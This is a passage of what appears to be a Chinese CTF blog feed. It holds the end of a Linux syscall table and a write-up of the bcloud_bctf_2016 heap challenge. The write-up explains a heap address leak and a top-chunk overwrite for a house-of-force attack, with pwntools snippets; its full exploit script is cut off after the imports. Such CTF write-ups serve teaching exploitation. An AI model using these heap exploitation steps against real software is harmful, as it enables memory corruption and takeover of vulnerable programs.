*utmr</td><td>struct  itimerspec *otmr</td><td></td><td></td></tr><tr><td>287</td><td>sys_timerfd_gettime</td><td>0x11F</td><td>int  ufd</td><td>struct  itimerspec *otmr</td><td></td><td></td><td></td><td></td></tr><tr><td>288</td><td>sys_accept4</td><td>0x120</td><td>int  fd</td><td>struct  sockaddr *upeer_sockaddr</td><td>int  *upeer_addrlen</td><td>int  flags</td><td></td><td></td></tr><tr><td>289</td><td>sys_signalfd4</td><td>0x121</td><td>int  ufd</td><td>sigset_t  *user_mask</td><td>size_t  sizemask</td><td>int  flags</td><td></td><td></td></tr><tr><td>290</td><td>sys_eventfd2</td><td>0x122</td><td>unsigned  int count</td><td>int  flags</td><td></td><td></td><td></td><td></td></tr><tr><td>291</td><td>sys_epoll_create1</td><td>0x123</td><td>int  flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>292</td><td>sys_dup3</td><td>0x124</td><td>unsigned  int oldfd</td><td>unsigned  int newfd</td><td>int  flags</td><td></td><td></td><td></td></tr><tr><td>293</td><td>sys_pipe2</td><td>0x125</td><td>int  *filedes</td><td>int  flags</td><td></td><td></td><td></td><td></td></tr><tr><td>294</td><td>sys_inotify_init1</td><td>0x126</td><td>int  flags</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>295</td><td>sys_preadv</td><td>0x127</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td>unsigned  long pos_l</td><td>unsigned  long pos_h</td><td></td></tr><tr><td>296</td><td>sys_pwritev</td><td>0x128</td><td>unsigned  long fd</td><td>const  struct iovec *vec</td><td>unsigned  long vlen</td><td>unsigned  long pos_l</td><td>unsigned  long pos_h</td><td></td></tr><tr><td>297</td><td>sys_rt_tgsigqueueinfo</td><td>0x129</td><td>pid_t  tgid</td><td>pid_t  pid</td><td>int  sig</td><td>siginfo_t  *uinfo</td><td></td><td></td></tr><tr><td>298</td><td>sys_perf_event_open</td><td>0x12A</td><td>struct  perf_event_attr *attr_uptr</td><td>pid_t  pid</td><td>int  cpu</td><td>int  group_fd</td><td>unsigned  long flags</td><td></td></tr><tr><td>299</td><td>sys_recvmmsg</td><td>0x12B</td><td>int  fd</td><td>struct  msghdr *mmsg</td><td>unsigned  int vlen</td><td>unsigned  int flags</td><td>struct  timespec *timeout</td><td></td></tr><tr><td>300</td><td>sys_fanotify_init</td><td>0x12C</td><td>unsigned  int flags</td><td>unsigned  int event_f_flags</td><td></td><td></td><td></td><td></td></tr><tr><td>301</td><td>sys_fanotify_mark</td><td>0x12D</td><td>long  fanotify_fd</td><td>long  flags</td><td>__u64  mask</td><td>long  dfd</td><td>long  pathname</td><td></td></tr><tr><td>302</td><td>sys_prlimit64</td><td>0x12E</td><td>pid_t  pid</td><td>unsigned  int resource</td><td>const  struct rlimit64 *new_rlim</td><td>struct  rlimit64 *old_rlim</td><td></td><td></td></tr><tr><td>303</td><td>sys_name_to_handle_at</td><td>0x12F</td><td>int  dfd</td><td>const  char *name</td><td>struct  file_handle *handle</td><td>int  *mnt_id</td><td>int  flag</td><td></td></tr><tr><td>304</td><td>sys_open_by_handle_at</td><td>0x130</td><td>int  dfd</td><td>const  char *name</td><td>struct  file_handle *handle</td><td>int  *mnt_id</td><td>int  flags</td><td></td></tr><tr><td>305</td><td>sys_clock_adjtime</td><td>0x131</td><td>clockid_t  which_clock</td><td>struct  timex *tx</td><td></td><td></td><td></td><td></td></tr><tr><td>306</td><td>sys_syncfs</td><td>0x132</td><td>int  fd</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>307</td><td>sys_sendmmsg</td><td>0x133</td><td>int  fd</td><td>struct  mmsghdr *mmsg</td><td>unsigned  int vlen</td><td>unsigned  int flags</td><td></td><td></td></tr><tr><td>308</td><td>sys_setns</td><td>0x134</td><td>int  fd</td><td>int  nstype</td><td></td><td></td><td></td><td></td></tr><tr><td>309</td><td>sys_getcpu</td><td>0x135</td><td>unsigned  *cpup</td><td>unsigned  *nodep</td><td>struct  getcpu_cache *unused</td><td></td><td></td><td></td></tr><tr><td>310</td><td>sys_process_vm_readv</td><td>0x136</td><td>pid_t  pid</td><td>const  struct iovec *lvec</td><td>unsigned  long liovcnt</td><td>const  struct iovec *rvec</td><td>unsigned  long riovcnt</td><td>unsigned  long flags</td></tr><tr><td>311</td><td>sys_process_vm_writev</td><td>0x137</td><td>pid_t  pid</td><td>const  struct iovec *lvec</td><td>unsigned  long liovcnt</td><td>const  struct iovcc *rvec</td><td>unsigned  long riovcnt</td><td>unsigned  long flags</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来源&lt;a href=&quot;https://rninche01.tistory.com/entry/Linux-system-call-table-%EC%A0%95%EB%A6%ACx86-x64&quot;&gt;https://rninche01.tistory.com/entry/Lin</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>bcloud-bctf-2016</title>
    <link href="http://blog.k0nashi.cn/2021/09/01/bcloud-bctf-2016/"/>
    <id>http://blog.k0nashi.cn/2021/09/01/bcloud-bctf-2016/</id>
    <published>2021-09-01T08:02:26.000Z</published>
    <updated>2021-09-14T07:32:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="house-of-force-bcloud-bctf-2016"><a href="#house-of-force-bcloud-bctf-2016" class="headerlink" title="[house of force]bcloud_bctf_2016"></a>[house of force]bcloud_bctf_2016</h1><p>题目链接：<a href="https://buuoj.cn/challenges#bcloud_bctf_2016">https://buuoj.cn/challenges#bcloud_bctf_2016</a></p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h4 id="先看看main函数"><a href="#先看看main函数" class="headerlink" title="先看看main函数"></a>先看看main函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  start_fun();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( sub_8048760() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        print();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Syn();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        Quit();</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_8048C6C();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的菜单题格式。先入为主很容易会去分析菜单的各个函数的功能，其实这几个功能都没有可以利用的漏洞，但我们先看看每个函数的作用。</p><h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; books_content[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Lack of space. Upgrade your account with just $100 :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:&quot;</span>);</span><br><span class="line">  size = read_16Byte();</span><br><span class="line">  books_content[i] = (<span class="keyword">int</span>)<span class="built_in">malloc</span>(size + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !books_content[i] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  books_size[i] = size;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the content:&quot;</span>);</span><br><span class="line">  your_read(books_content[i], size, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Create success, the id is %d\n&quot;</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  syn_flags[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读入size，代表size可控。然后将chunk的首地址保存在books_content中。然后输出content。由于创建的大小比申请大小多4，所以不会导致堆溢出。</p><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;WTF? Something strange happened.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大骗子</p><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> _16Byte; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id:&quot;</span>);</span><br><span class="line">  _16Byte = read_16Byte();</span><br><span class="line">  <span class="keyword">if</span> ( _16Byte &lt; <span class="number">0</span> || _16Byte &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid ID.&quot;</span>);</span><br><span class="line">  v2 = books_content[_16Byte];</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Note has been deleted.&quot;</span>);</span><br><span class="line">  v3 = books_size[_16Byte];</span><br><span class="line">  syn_flags[_16Byte] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the new content:&quot;</span>);</span><br><span class="line">  your_read(v2, v3, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Edit success.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入一个编号，修改对应编号chunk的内容。没什么特别的。</p><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> _16Byte; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id:&quot;</span>);</span><br><span class="line">  _16Byte = read_16Byte();</span><br><span class="line">  <span class="keyword">if</span> ( _16Byte &lt; <span class="number">0</span> || _16Byte &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid ID.&quot;</span>);</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)books_content[_16Byte];</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Note has been deleted.&quot;</span>);</span><br><span class="line">  books_content[_16Byte] = <span class="number">0</span>;</span><br><span class="line">  books_size[_16Byte] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择一个chunk，将其free，指针也会删除，不会出现野指针。</p><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><p>syn,quit,sub_8048C6C都没什么用，就不赘述了。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>分析一大串菜单函数发现一无所获，原来真正的漏洞藏在start_fun()里，我们来看一下里面是什么。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start_fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  fun1();</span><br><span class="line">  fun2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面套了两个函数，进去看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">fun1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  your_read((<span class="keyword">int</span>)s, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  name = (<span class="keyword">int</span>)v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, s);</span><br><span class="line">  sub_8048779(v2);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fun1函数有一个不是很明显的地址泄露。</p><p>先由your_read读取0x40个字符到s中，而s的大小刚好是0x40(64)。虽然在your_read函数中特地给读入的字符串后加入了一个\x00截断，但是如果我们读入0x40个字符的话，会多一个\x00溢出，溢出到v2的地址范围</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901125520514.png" alt="image-20210901125520514"></p><p>虽然到现在为止还没有问题，但是在这之后，程序直接将chunk的地址写到v2中，这就导致截断符\x00被覆盖，从而使strcpy会顺带读出后面跟着的chunk首地址。</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901125740975.png" alt="image-20210901125740975"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh.sendafter(<span class="string">&quot;name:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">chunk_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;chunkaddr:&quot;</span> + <span class="built_in">hex</span>(chunk_addr))</span><br></pre></td></tr></table></figure><p>只需要这样就能轻松泄露出chunk的首地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun2</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-9Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *org; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">68</span>]; <span class="comment">// [esp+60h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *host; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Org:&quot;</span>);</span><br><span class="line">  your_read((<span class="keyword">int</span>)s, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Host:&quot;</span>);</span><br><span class="line">  your_read((<span class="keyword">int</span>)v2, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  host = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  org = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dword_804B0C8 = (<span class="keyword">int</span>)org;</span><br><span class="line">  dword_804B148 = (<span class="keyword">int</span>)host;</span><br><span class="line">  <span class="built_in">strcpy</span>(host, v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(org, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OKay! Enjoy:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fun2中有更关键的覆盖，也是和上个函数一样的漏洞，只不过这里更加复杂一些。</p><p>这里有两个buf，一个是s，一个是v2，他们都是暂存输入的字符，然后将字符用strcpy复制到chunk中。</p><p>可以从变量的定义得出这几个变量在栈中的顺序</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901130243683.png" alt="image-20210901130243683"></p><p>首先读入0x40个’b’给s,再读入一个p32(0xffffffff)给v2（为什么是0xffffffff之后再说）</p><p>内存会变成这样：</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901130506017.png" alt="image-20210901130506017"></p><p>很显然，现在这两块内存是被\x00截断的，并不会有什么关联。但是当malloc给org和host赋值以后就不一样了</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901130621977.png" alt="image-20210901130621977"></p><p>malloc以后，org返回的地址被存入了s和v2中间的一块内存单元，导致\x00被覆盖。</p><p>此时如果再用strcpy将s复制到chunk中，就会导致堆溢出。</p><p>我们直接用gdb看一下内存的变化情况：</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901130954358.png" alt="image-20210901130954358"></p><p>​                                                                                            malloc前↑    malloc后↓</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901131052186.png" alt="image-20210901131052186"></p><p>堆的情况：</p><p>strcpy(org, s);前</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901131309086.png" alt="image-20210901131309086"></p><p>strcpy(org, s);后</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901131331443.png" alt="image-20210901131331443"></p><p>不知是否有注意到，在strcpy前，0x92ad0dc的位置有一个0x00020e71，这是topchunk的size。而strcpy之后，这个size刚好被我们的0xffffffff覆盖了。</p><p>可以看一下现在的topchunk状态：</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901131541139.png" alt="image-20210901131541139"></p><p>topchunk的大小被我们改成了0xffffffff，此时就可以利用house of force的思路，分配一个很大很大的chunk，直到下一个chunk的地址为我们想要任意篡改的目标地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">topchunk_addr = chunk_addr + <span class="number">0xd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;topchunk = &quot;</span>,<span class="built_in">hex</span>(topchunk_addr))</span><br><span class="line">    </span><br><span class="line">books_content = <span class="number">0x0804B120</span></span><br><span class="line">offset = books_content - topchunk_addr - <span class="number">20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;offset = &quot;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line">    </span><br><span class="line">add(offset,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901142756726.png" alt="image-20210901142756726"></p><p>这里会出现一个问题，就是offset为什么是负数。</p><p>在说明这个问题之前，要先了解elf程序结构</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901143159333.png" alt="image-20210901143159333"></p><p>图中红框框的部分就是我们的top_chunk，上方地址为高，下方地址为低。</p><p>一般来说top_chunk是下底边往上慢慢减少的。</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901143450613.png" alt="image-20210901143450613"></p><p>但是我们在这题中，把topchunk的大小改成了0xffffffff，那就相当于整个内存空间都变成了top_chunk。</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901143729200.png" alt="image-20210901143729200"></p><p>然后malloc函数的参数是默认当做unsigned int的，也就是说我们传入一个负数会被当做一个很大很大的整数，整个数字大到超过了上图中，上半个top_chunk。由于一个字长只能存储8个字节，因此当top_chunk的边界超过上边界的时候，就会进位（实际上进位的那一位丢失了），从而回到最底层0x00000000的地方，继续分配。就以此题为例，我们的目标是bss段的books_content，那么当我们传入-0xed1fcc时，我们malloc出的大chunk覆盖了这些空间：</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901144436052.png" alt="image-20210901144436052"></p><p>也可以在chunk的头部看看chunk究竟有多大</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901144631117.png" alt="image-20210901144631117"></p><p>可以看到是非常大的size。(这个地址是我们之前覆写了0xffffffff的位置)</p><p>此时我们之前分配的所有小chunk也都被覆盖了</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901144806031.png" alt="image-20210901144806031"></p><p>看一下此时topchunk的地址</p><p><img src="/2021/09/01/bcloud-bctf-2016/image-20210901144841428.png" alt="image-20210901144841428"></p><p>我们的目标是books_content(0x804b120)</p><p>top_chunk已经分配到这个地方以后，我们只需要再malloc一个新chunk，就可以在books_content上构造堆块，从而控制堆指针来实现任意地址写。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.ui <span class="keyword">import</span> pause</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span 